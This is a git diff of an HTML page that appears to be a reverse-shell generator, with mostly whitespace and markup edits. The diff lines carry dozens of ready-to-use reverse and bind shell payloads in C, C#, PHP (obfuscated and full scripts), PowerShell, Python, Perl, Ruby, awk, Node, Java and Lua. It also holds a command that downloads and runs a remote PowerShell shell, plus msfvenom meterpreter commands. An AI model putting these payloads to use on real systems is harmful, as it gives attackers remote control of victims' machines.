@@ -221,7 +221,7 @@ background-color: #666;
  
     padding: 22px 16px;
  flex-wrap:wrap;
-}
+}  
 
 .container{
     display: flex;
@@ -293,7 +293,7 @@ background-color: #666;
  
   <div class="w3-container">
   
-  <h3 class="w3-text-theme w3-large">
+  <h3 class="w3-text-theme w3-large"> 
   
   <div class="w3-center">
 <div class="w3-bar w3-theme">
@@ -395,7 +395,7 @@ result.textContent = `  ${event.target.value}`;
 
 });
 
-  </script>
+  </script>  
 
 
  </div>
@@ -460,9 +460,9 @@ osans.addEventListener('change', (event) => {
      
      
     <div class="w3-container w3-right-align">
-  <h3 class="w3-text-theme w3-large">
+  <h3 class="w3-text-theme w3-large">    
   
-    <label>shell:
+    <label>shell: 
 
 <select class="shell" name="shell">
 
@@ -869,7 +869,7 @@ int main(void){
    <p> struct sockaddr_in revsockaddr;</p>
 
    <p>  int sockt = socket(AF_INET, SOCK_STREAM, 0);</p>
-   <p>  revsockaddr.sin_family = AF_INET;   </p>
+   <p>  revsockaddr.sin_family = AF_INET;   </p>    
    <p>  revsockaddr.sin_port = htons(port);</p>
    <div id="mydiv">
    <p>  revsockaddr.sin_addr.s_addr = inet_addr("</p>
@@ -893,7 +893,7 @@ int main(void){
      <div class="shellans"> </div>
      <p>", argv, NULL);</p>
 </div>
-     <p> return 0;  </p>
+     <p> return 0;  </p>     
 } </p>
    
      
@@ -923,7 +923,7 @@ int main(void){
 <div id="mydiv">
  <p> char port[6] = "</p>
   <p id="port thirty one"></p>
-  <p>";   </p>
+  <p>";   </p>   
  
  </div>
 
@@ -973,7 +973,7 @@ int main(void){
   <h3 class="  w3-large w3-display-container ">
    
   <p>Command:</p>
-    <p>
+    <p>  
     
    <p>    using System;</p>
   <p> using System.Text;</p>
@@ -987,16 +987,16 @@ int main(void){
 
   <p> namespace ConnectBack</p>
   <p> {</p>
-  <p>     public class Program</p>
-  <p>     {</p>
-      <p>     static StreamWriter streamWriter;</p>
+  <p> 	public class Program</p>
+  <p> 	{</p>
+	  <p> 	static StreamWriter streamWriter;</p>
 
-      <p>     public static void Main(string[] args)</p>
-      <p>     {</p>
+	  <p> 	public static void Main(string[] args)</p>
+	  <p> 	{</p>
       
        
  <div id="mydiv">
-          <p>     using(TcpClient client = new TcpClient("</p>
+		  <p> 	using(TcpClient client = new TcpClient("</p>
         <p id="ip thirty two"></p>
       <p>    ", </p>
           <p> &nbsp </p>
@@ -1004,39 +1004,39 @@ int main(void){
          <p> ))</p>
           </div>
           
-          <p>     {</p>
-                  <p> using(Stream stream = client.GetStream())</p>
-                  <p> {</p>
-                      <p> using(StreamReader rdr = new StreamReader(stream))</p>
-                      <p> {</p>
-                          <p> streamWriter = new StreamWriter(stream);</p>
-                        
-                      <p>     StringBuilder strInput = new StringBuilder();</p>
+		  <p> 	{</p>
+				  <p> using(Stream stream = client.GetStream())</p>
+				  <p> {</p>
+					  <p> using(StreamReader rdr = new StreamReader(stream))</p>
+					  <p> {</p>
+						  <p> streamWriter = new StreamWriter(stream);</p>
+						
+					  <p> 	StringBuilder strInput = new StringBuilder();</p>
   
-      <p>                     Process p = new Process();</p>
-              <p>             p.StartInfo.FileName = "cmd.exe";</p>
-                      <p>     p.StartInfo.CreateNoWindow = true;</p>
-                          <p> p.StartInfo.UseShellExecute = false;</p>
-                          <p> p.StartInfo.RedirectStandardOutput = true;</p>
-                          <p> p.StartInfo.RedirectStandardInput = true;</p>
-                          <p> p.StartInfo.RedirectStandardError = true;</p>
-                          <p> p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);</p>
-                          <p> p.Start();</p>
-                          <p> p.BeginOutputReadLine();</p>
+	  <p> 					Process p = new Process();</p>
+			  <p> 			p.StartInfo.FileName = "cmd.exe";</p>
+					  <p> 	p.StartInfo.CreateNoWindow = true;</p>
+						  <p> p.StartInfo.UseShellExecute = false;</p>
+						  <p> p.StartInfo.RedirectStandardOutput = true;</p>
+						  <p> p.StartInfo.RedirectStandardInput = true;</p>
+						  <p> p.StartInfo.RedirectStandardError = true;</p>
+						  <p> p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);</p>
+						  <p> p.Start();</p>
+						  <p> p.BeginOutputReadLine();</p>
 <br>
-                          <p> while(true)</p>
-                          <p> {</p>
-                          <p>     strInput.Append(rdr.ReadLine());</p>
-                      <p>         //strInput.Append("\n");</p>
-                      <p>         p.StandardInput.WriteLine(strInput);</p>
-                      <p>         strInput.Remove(0, strInput.Length);</p>
-                      <p>     }</p>
-                  <p>     }</p>
-              <p>     }</p>
-          <p>     }</p>
-      <p>     }</p>
+						  <p> while(true)</p>
+						  <p> {</p>
+						  <p> 	strInput.Append(rdr.ReadLine());</p>
+					  <p> 		//strInput.Append("\n");</p>
+					  <p> 		p.StandardInput.WriteLine(strInput);</p>
+					  <p> 		strInput.Remove(0, strInput.Length);</p>
+					  <p> 	}</p>
+				  <p> 	}</p>
+			  <p> 	}</p>
+		  <p> 	}</p>
+	  <p> 	}</p>
 
-      <p>     private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)</p>
+	  <p> 	private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)</p>
        <p>    {</p>
          <p>      StringBuilder strOutput = new StringBuilder();</p>
 
@@ -1052,7 +1052,7 @@ int main(void){
             <p>   }</p>
         <p>   }</p>
 
-      <p> }</p>
+	  <p> }</p>
   <p> }</p>
     
     
@@ -1071,7 +1071,7 @@ int main(void){
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p> 
      <p>    module Main where </p>
 
     <p> import System.Process </p>
@@ -1128,7 +1128,7 @@ int main(void){
    
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p> 
     perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"</p>
       <p id="ip thirty five"></p>
       <p> :</p>
@@ -1177,7 +1177,7 @@ int main(void){
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p>     
     <p>php -r '$ð="1";$ð="2";$ð</p>
     <p>="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";</p>
     <p>$ð="9";$ð="0";$ð¤¢=" ";$ð¤="</p>
@@ -1193,7 +1193,7 @@ int main(void){
     <p>"</p>
      <p id="ip thirty seven"></p>
        <p>"</p>
-       <p> ;$ð» =</p> &nbsp
+       <p> ;$ð» =</p> &nbsp 
        <p id="port thirty seven"></p>
      <p>;$ð = "</p>
      
@@ -1206,7 +1206,7 @@ int main(void){
      <p>$ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð</p>
      <p>;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. </p>
      <p>$ð. $ð;$ð½($ð);'</p>
-    </p>
+    </p> 
 </div>
 </div>
 
@@ -1219,7 +1219,7 @@ int main(void){
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p> 
     
    <p> &lt?php</p>
 <p>// php-reverse-shell - A Reverse Shell implementation in PHP.</p> <p>Comments stripped to slim it down. RE:</p> <p>https://raw.githubusercontent.com/pentestmonkey/php-reverse- shell/master/php-reverse-shell.php</p>
@@ -1236,7 +1236,7 @@ $ip = '</p>
 
 
   <div id="mydiv">
-$port =
+$port = 
 <p id="port thirty eight"></p>
 ;
 </div>
@@ -1252,24 +1252,24 @@ $port =
 <p>$debug = 0;</p>
 
 <p>if (function_exists('pcntl_fork')) {</p>
-    <p>$pid = pcntl_fork();</p>
-    
-    <p>if ($pid == -1) {</p>
-    <p>    printit("ERROR: Can't fork");</p>
-    <p>    exit(1);</p>
-<p>    }</p>
-    
-    <p>if ($pid) {</p>
-<p>        exit(0);  // Parent exits</p>
-<p>    }</p>
-<p>    if (posix_setsid() == -1) {</p>
-    <p>    printit("Error: Can't setsid()");</p>
-        <p>exit(1);</p>
-<p>    }</p>
+	<p>$pid = pcntl_fork();</p>
+	
+	<p>if ($pid == -1) {</p>
+	<p>	printit("ERROR: Can't fork");</p>
+	<p>	exit(1);</p>
+<p>	}</p>
+	
+	<p>if ($pid) {</p>
+<p>		exit(0);  // Parent exits</p>
+<p>	}</p>
+<p>	if (posix_setsid() == -1) {</p>
+	<p>	printit("Error: Can't setsid()");</p>
+		<p>exit(1);</p>
+<p>	}</p>
 
-    <p>$daemon = 1;</p>
+	<p>$daemon = 1;</p>
 <p>} else {</p>
-<p>    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</p>
+<p>	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");</p>
 <p>}</p>
 
 <p>chdir("/");</p>
@@ -1279,8 +1279,8 @@ $port =
 <p>// Open reverse connection</p>
 <p>$sock = fsockopen($ip, $port, $errno, $errstr, 30);</p>
 <p>if (!$sock) {</p>
-<p>    printit("$errstr ($errno)");</p>
-<p>    exit(1);</p>
+<p>	printit("$errstr ($errno)");</p>
+<p>	exit(1);</p>
 <p>}</p>
 
 <p>$descriptorspec = array(</p>
@@ -1292,8 +1292,8 @@ $port =
 <p>$process = proc_open($shell, $descriptorspec, $pipes);
 </p>
 <p>if (!is_resource($process)) {</p>
-    <p>printit("ERROR: Can't spawn shell");</p>
-    <p>exit(1);</p>
+	<p>printit("ERROR: Can't spawn shell");</p>
+	<p>exit(1);</p>
 <p>}</p>
 
 <p>stream_set_blocking($pipes[0], 0);</p>
@@ -1304,39 +1304,39 @@ $port =
 <p>printit("Successfully opened reverse shell to $ip:$port");</p>
 
 <p>while (1) {</p>
-<p>    if (feof($sock)) {</p>
-<p>        printit("ERROR: Shell connection terminated");</p>
-<p>        break;</p>
-<p>    }</p>
+<p>	if (feof($sock)) {</p>
+<p>		printit("ERROR: Shell connection terminated");</p>
+<p>		break;</p>
+<p>	}</p>
 
-<p>    if (feof($pipes[1])) {</p>
-<p>        printit("ERROR: Shell process terminated");</p>
-<p>        break;</p>
-<p>    }</p>
+<p>	if (feof($pipes[1])) {</p>
+<p>		printit("ERROR: Shell process terminated");</p>
+<p>		break;</p>
+<p>	}</p>
 
-<p>    $read_a = array($sock, $pipes[1], $pipes[2]);</p>
-<p>    $num_changed_sockets = stream_select($read_a, $write_a,</p> <p>$error_a, null);</p>
+<p>	$read_a = array($sock, $pipes[1], $pipes[2]);</p>
+<p>	$num_changed_sockets = stream_select($read_a, $write_a,</p> <p>$error_a, null);</p>
 
-    <p>if (in_array($sock, $read_a)) {</p>
-    <p>    if ($debug) printit("SOCK READ");</p>
-    <p>    $input = fread($sock, $chunk_size);</p>
-    <p>    if ($debug) printit("SOCK: $input");</p>
-    <p>    fwrite($pipes[0], $input);</p>
-    <p>}</p>
+	<p>if (in_array($sock, $read_a)) {</p>
+	<p>	if ($debug) printit("SOCK READ");</p>
+	<p>	$input = fread($sock, $chunk_size);</p>
+	<p>	if ($debug) printit("SOCK: $input");</p>
+	<p>	fwrite($pipes[0], $input);</p>
+	<p>}</p>
 
-    <p>if (in_array($pipes[1], $read_a)) {</p>
-    <p>    if ($debug) printit("STDOUT READ");</p>
-    <p>    $input = fread($pipes[1], $chunk_size);</p>
-    <p>    if ($debug) printit("STDOUT: $input");</p>
-    <p>    fwrite($sock, $input);</p>
-    <p>}</p>
+	<p>if (in_array($pipes[1], $read_a)) {</p>
+	<p>	if ($debug) printit("STDOUT READ");</p>
+	<p>	$input = fread($pipes[1], $chunk_size);</p>
+	<p>	if ($debug) printit("STDOUT: $input");</p>
+	<p>	fwrite($sock, $input);</p>
+	<p>}</p>
 
-    <p>if (in_array($pipes[2], $read_a)) {</p>
-    <p>    if ($debug) printit("STDERR READ");</p>
-    <p>    $input = fread($pipes[2], $chunk_size);</p>
-    <p>    if ($debug) printit("STDERR: $input");</p>
-    <p>    fwrite($sock, $input);</p>
-    <p>}</p>
+	<p>if (in_array($pipes[2], $read_a)) {</p>
+	<p>	if ($debug) printit("STDERR READ");</p>
+	<p>	$input = fread($pipes[2], $chunk_size);</p>
+	<p>	if ($debug) printit("STDERR: $input");</p>
+	<p>	fwrite($sock, $input);</p>
+	<p>}</p>
 <p>}</p>
 
 <p>fclose($sock);</p>
@@ -1346,9 +1346,9 @@ $port =
 <p>proc_close($process);</p>
 
 <p>function printit ($string) {</p>
-<p>    if (!$daemon) {</p>
-<p>        print "$string\n";</p>
-<p>    }</p>
+<p>	if (!$daemon) {</p>
+<p>		print "$string\n";</p>
+<p>	}</p>
 <p>}</p>
 
 <p>?></p>
@@ -1368,7 +1368,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p>  
     
     <p>&lt?php</p>
 <p>// Copyright (c) 2020 Ivan Sincek  </p>
@@ -1514,7 +1514,7 @@ $port =
                <p>     $status = proc_get_status($process);  </p>
                <p>     @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");  </p>
                  <p>   do {  </p>
-                <p><p>        $status = proc_get_status($process);  </p>
+				<p><p>		$status = proc_get_status($process);  </p>
                  <p>       if (feof($socket)) { // check for end-of-file on SOCKET  </p>
                   <p>          echo "SOC_ERROR: Shell connection has been terminated\n"; break;  </p>
                   <p>      } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running  </p>
@@ -1567,7 +1567,7 @@ $port =
 
 <p>',&nbsp</p>
 <p id="port thirty nine"></p>
-<p>);  </p>
+<p>);  </p>  
 
 </div>
 
@@ -1595,7 +1595,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p> 
     
    <p> &lt html></p>
 <p> &lt body></p>
@@ -1634,7 +1634,7 @@ $port =
   <p>Command:</p>
   
   <div id="mydiv">
-    <p>
+    <p>  
     
     php -r '$sock=fsockopen("</p>
     <p id="ip fourty"></p>
@@ -1663,7 +1663,7 @@ $port =
    
   <p>Command:</p>
     <div id="mydiv">
-    <p>
+    <p>  
     
     php -r '$sock=fsockopen("</p>
     <p id="ip fourty one"></p>
@@ -1693,7 +1693,7 @@ $port =
    
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p>  
     
     php -r '$sock=fsockopen("</p>
     <p id="ip fourty two"></p>
@@ -1723,7 +1723,7 @@ $port =
    
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p>  
     
     php -r '$sock=fsockopen("</p>
     <p id="ip fourty three"></p>
@@ -1753,7 +1753,7 @@ $port =
    
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p> 
     php -r '$sock=fsockopen("</p>
         <p id="ip fourty four"></p>
     <p>",&nbsp</p>
@@ -1776,7 +1776,7 @@ $port =
    
   <p>Command:</p>
      <div id="mydiv">
-    <p>
+    <p> 
     php -r '$sock=fsockopen("</p>
        <p id="ip fourty five"></p>
      <p>",</p>
@@ -1804,7 +1804,7 @@ $port =
    
   <p>Command:</p>
      <div id="mydiv">
-    <p>
+    <p> 
     php -r '$sock=fsockopen("</p>
      <p id="ip fourty six"></p>
      <p>",</p>
@@ -1833,7 +1833,7 @@ $port =
    
   <p>Command:</p>
      <div id="mydiv">
-    <p>
+    <p>   
     
     
     IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell&nbsp</p>
@@ -1858,7 +1858,7 @@ $port =
    
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p>  
     awk 'BEGIN {s = "/inet/tcp/0/</p>
      <p id="ip fourty eight"></p>
    <p> /</p>
@@ -1912,14 +1912,14 @@ $port =
    <p>
   <p>Command:</p>
       <div id="mydiv">
-    <p>
+    <p>  
     powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('</p>
     <p id="ip fifty"></p>
      <p>',</p>
     <p id="port fifty"></p>
  
   <p>  );$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};</p>
-      </div>
+      </div> 
     <p>   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;</p>
      <p>  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</p>
       <p> $sendback = (iex $data 2>&amp1 | Out-String );$sendback2 = $sendback + 'PS ' </p>
@@ -1941,7 +1941,7 @@ $port =
 <div id="power3" class="tabcontent">
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
-   <p>
+   <p> 
   <p>Command:</p>
   
  
@@ -1981,10 +1981,10 @@ $port =
  <div class="float-right-child w3-container w3-border">
   <h3 class="  w3-large w3-display-container">
    
-      <p>
+      <p> 
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p> 
     powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('</p>
     
      <p id="ip fifty two"></p>
@@ -2075,7 +2075,7 @@ $port =
   <p>Command:</p>
   
   <div id="mydiv">
-    <p>
+    <p>  
     
     zsh -c 'zmodload zsh/net/tcp && ztcp </p>
     <p>&nbsp</p>
@@ -2131,7 +2131,7 @@ $port =
    <p>
   <p>Command:</p>
   <div id="mydiv">
-    <p>
+    <p> 
     python -c 'import socket,subprocess,os;s=socket.socket</p>
     <p>(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
     
@@ -2147,7 +2147,7 @@ $port =
   
     
     
-  </div>
+  </div> 
      </p>
 </div>
 </div>
@@ -2160,7 +2160,7 @@ $port =
   <p>Command:</p>
   
   <div id="mydiv">
-    <p>
+    <p> 
     export RHOST="</p>
     
      <p id="ip fifty six"></p>
@@ -2179,7 +2179,7 @@ $port =
     
      
     
-   </div>
+   </div>  
    </p>
 </div>
 </div>
@@ -2193,7 +2193,7 @@ $port =
    <p>
   <p>Command:</p>
   <div id="mydiv">
-    <p>
+    <p> 
     python3 -c 'import socket,subprocess,os;s=socket.socket</p>
    <p> (socket.AF_INET,socket.SOCK_STREAM);s.connect(("</p>
     
@@ -2207,8 +2207,8 @@ $port =
  <p>  ")'</p>
     
     
- </div>
- </p>
+ </div>   
+ </p> 
 </div>
 </div>
  
@@ -2241,7 +2241,7 @@ $port =
     
     </p>
     
-</div>
+</div>     
 </div>
 </div>
 
@@ -2255,7 +2255,7 @@ $port =
    
   <p>Command:</p>
   <div id="mydiv">
-    <p>
+    <p> 
     TF=$(mktemp -u);mkfifo $TF && telnet&nbsp</p>
     
      <p id="ip fifty nine"></p>
@@ -2281,7 +2281,7 @@ $port =
    
   <p>Command:</p>
    <div id="mydiv">
-    <p>
+    <p> 
     ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("</p>
     
       <p id="ip sixty"></p>
@@ -2292,7 +2292,7 @@ $port =
    
     </p>
     
-  </div>
+  </div>   
 </div>
 </div>
 
@@ -2303,7 +2303,7 @@ $port =
    
   <p>Command:</p>
      <div id="mydiv">
-    <p>
+    <p> 
     
     ruby -rsocket -e'exit if fork;c=TCPSocket.new("</p>
     
@@ -2314,11 +2314,11 @@ $port =
     
   <p>  ");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
     
-    </p>
+    </p> 
      
 </div>
 </div>
-  </div>
+  </div> 
 
 
 <div id="dart" class="tabcontent">
@@ -2326,7 +2326,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p>  
     
   <p>    import 'dart:io'; </p>
 <p>  import 'dart:convert'; </p>
@@ -2395,7 +2395,7 @@ $port =
       <p> &nbsp</p>
     <p>EXEC: </p>
     <div class="thirtytwo"> </div>
- </div>
+ </div>    
 </div>
 </div>
 
@@ -2415,7 +2415,7 @@ $port =
      <div class="thirtythree"> </div>
    <p> ',pty,stderr,setsid,sigint,sane</p>
   
- </div>
+ </div>    
 </div>
 </div>
 
@@ -2446,7 +2446,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p> 
     
      <p> (function(){ </p>
     <p>  var net = require("net"), </p>
@@ -2490,7 +2490,7 @@ $port =
    <p>
   <p>Command:</p>
   <div id="mydiv">
-    <p>
+    <p> 
     String host="</p>
     <p id="ip sixty seven"></p>
     
@@ -2521,7 +2521,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p> 
     
     
     <p> public class shell {</p>
@@ -2594,7 +2594,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p>  
     
     
     
@@ -2662,7 +2662,7 @@ $port =
   <h3 class="  w3-large w3-display-container">
    
   <p>Command:</p>
-    <p>
+    <p>  
       <div id="mydiv">
   <p>  String command = "var host = '</p>
   <p id="ip seventy one"></p>
@@ -2738,7 +2738,7 @@ ref.add(new StringRefAddr("x", x);</p>
      <p> &nbsp</p>
    <p> -i &lt&3 >&3 2>&3');"
     </p>
-  </div>
+  </div>  
 </div>
 </div>
 
@@ -2757,7 +2757,7 @@ ref.add(new StringRefAddr("x", x);</p>
     <p id="port seventy three"></p>
     
      <p> &nbsp</p>
-     </div>
+     </div> 
     <p> local socket = require("socket") local tcp =</p>
        <p>  socket.tcp() local io = require("io") tcp:connect(host, port);</p>
        <p>   while true do local cmd, status, partial = tcp:receive() local f =</p>
@@ -2825,69 +2825,68 @@ ref.add(new StringRefAddr("x", x);</p>
  <br>
  <br>
 <div class="w3-container">
- <div id="no">
+ <div id="mydiv">
 <br>
 <div class="tab">
   <button class="tablinks" onclick=" City(event, 'Python3 Bind')" id="defaultOpen">Python3 Bind</button>
   <button class="tablinks" onclick=" City(event, 'PHP Bind')">PHP Bind</button>
 </div>
-
+<br>
 <div id="Python3 Bind" class="tabcontent">
  
-  <h3 class="w3-text-theme w3-large w3-display-container">
+  <h3 class="w3-text-theme w3-large w3-display-container"> 
  
   <p>
   <div id="mydiv">
   <p>
-  python3 -c 'exec("""import socket as s,
-  subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);
-  s1.setsockopt(s.SOL_SOCKET,
-  s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",
-</p>
+  python3 -c 'exec("""import socket as s,</p>
+ <p> subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);</p>
+ <p> s1.setsockopt(s.SOL_SOCKET,</p>
+ <p> s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",</p>
+ 
 <p id="port again"></p>
-
+ 
 <p>
-));s1.listen(1);c,a=s1.accept();
-while True: d=c.recv(1024).decode();p=sp.Popen
-(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,
-stdin=sp.PIPE);c.sendall
-(p.stdout.read()+p.stderr.read())""")'
+));s1.listen(1);c,a=s1.accept();</p>
+<p>while True: d=c.recv(1024).decode();p=sp.Popen</p>
+<p>(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,</p>
+<p>stdin=sp.PIPE);c.sendall</p>
+<p>(p.stdout.read()+p.stderr.read())""")'</p>
 </p>
-</div>
+ 
 </p>
   </div>
-
+</div>
 
  
   
 
 <div id="PHP Bind" class="tabcontent">
  
-  <h3 class="w3-text-theme w3-large w3-display-container">
+  <h3 class="w3-text-theme w3-large w3-display-container"> 
    <p>
    <div id="mydiv">
-  <p>
-  php -r '$s=socket_create
-  (AF_INET,SOCK_STREAM,SOL_TCP);
-  socket_bind($s,"0.0.0.0",
-  </p>
+  <p> 
+  php -r '$s=socket_create</p>
+  <p>(AF_INET,SOCK_STREAM,SOL_TCP);</p>
+  <p>socket_bind($s,"0.0.0.0",</p>
+ 
  
  <p id="port once again"></p>
  
  <p>
- );
-  socket_listen($s,1);$cl=socket_accept($s);
-  while(1){if(!socket_write($cl,"$ ",2))exit;
-  $in=socket_read($cl,100);
-  $cmd=popen("$in","r");while(!feof($cmd))
-  {$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
-  </p>
-</div>
+ );</p>
+  <p>socket_listen($s,1);$cl=socket_accept($s);  </p>
+    <p>while(1){if(!socket_write($cl,"$ ",2))exit;  </p>
+    <p>$in=socket_read($cl,100);  </p>
+    <p>$cmd=popen("$in","r");while(!feof($cmd))  </p>
+    <p>{$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'  </p>
+ </div>
 </p>
 
 </div>
+ </div>
  
-</div>
  </div>
  
  </div>
@@ -2896,7 +2895,7 @@ stdin=sp.PIPE);c.sendall
 <div id="MSFVenom" class="w3-container city w3-animate-opacity">
  
  <br>
-<div id="no">
+<div id="mydiv">
  
 <div class="w3-container float-left-child">
  <div class=" tab vertical-menu w3-bar-item w3-container">
@@ -2931,9 +2930,10 @@ stdin=sp.PIPE);c.sendall
 <div id="WMSR" class="tabcontent">
  
  
-  <h3 class=" w3-large w3-display-container">
-  <div id="mydiv">
+  <h3 class=" w3-large w3-display-container">  
+ 
    <p>msfvenom -p windows/x64/meterpreter/reverse_tcp &nbsp </p>
+     <div id="mydiv">
    <p>LHOST=</p>
    <p id="ip one"></p>
    <p> &nbsp LPORT=</p>
@@ -2944,10 +2944,10 @@ stdin=sp.PIPE);c.sendall
  
 
 <div id="WMSlessR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-   <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
+   
   <p>msfvenom -p windows/x64/meterpreter_reverse_tcp &nbsp </p>
-  
+   <div id="mydiv">
    <p>LHOST=</p>
    <p id="ip two"></p>
    <p> &nbsp LPORT=</p>
@@ -2959,9 +2959,10 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="WSR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-  <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
+  
 <p> msfvenom -p windows/x64/shell/reverse_tcp &nbsp </p>
+<div id="mydiv">
 <p>LHOST=</p>
 <p id="ip three"></p>
  <p> &nbsp LPORT=</p>
@@ -2972,9 +2973,10 @@ stdin=sp.PIPE);c.sendall
 </div>
  
 <div id="WSRTCP" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-   <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container">  
+  
 <p> msfvenom -p windows/x64/shell_reverse_tcp &nbsp </p>
+ <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip four"></p>
 
@@ -2987,9 +2989,10 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="LMSR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-    <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container"> 
+
 <p> msfvenom -p linux/x64/meterpreter/reverse_tcp &nbsp </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 
  <p id="ip five"></p>
@@ -3004,9 +3007,10 @@ stdin=sp.PIPE);c.sendall
 
 
 <div id="LSR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
- <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container"> 
+ 
 <p> msfvenom -p linux/x64/shell_reverse_tcp &nbsp </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip six"></p>
 <p>&nbsp LPORT=</p>
@@ -3020,7 +3024,7 @@ stdin=sp.PIPE);c.sendall
 
 
 <div id="WBTS" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
   <div id="mydiv">
 <p> msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode &nbsp </p>
 
@@ -3030,8 +3034,9 @@ stdin=sp.PIPE);c.sendall
 
 <div id="mmSRT" class="tabcontent">
  <h3 class="w3-text-theme w3-large w3-display-container">
-  <div id="mydiv">
+ 
 <p> msfvenom -p osx/x64/meterpreter/reverse_tcp &nbsp </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip seven"></p>
 
@@ -3044,9 +3049,11 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="mmsR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-   <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container"> 
+ 
 <p> msfvenom -p osx/x64/meterpreter_reverse_tcp &nbsp </p>
+
+    <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip eight"></p>
 
@@ -3059,9 +3066,10 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="msR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-    <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
+ 
 <p> msfvenom -p osx/x64/shell_reverse_tcp &nbsp </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 
 <p id="ip nine"></p>
@@ -3075,9 +3083,10 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="PHPMSR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-     <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container"> 
+   
 <p> msfvenom -p php/meterpreter_reverse_tcp &nbsp </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip ten"></p>
 
@@ -3090,9 +3099,10 @@ stdin=sp.PIPE);c.sendall
 </div>
 
 <div id="PHPR" class="tabcontent">
- <h3 class="w3-text-theme w3-large w3-display-container">
-     <div id="mydiv">
+ <h3 class="w3-text-theme w3-large w3-display-container">    
+ 
 <p> msfvenom -p php/reverse_php &nbsp   </p>
+    <div id="mydiv">
 <p>LHOST=</p>
 <p id="ip eleven"></p>
 <p>&nbsp LPORT=</p>
@@ -3104,7 +3114,7 @@ stdin=sp.PIPE);c.sendall
 </div>
 
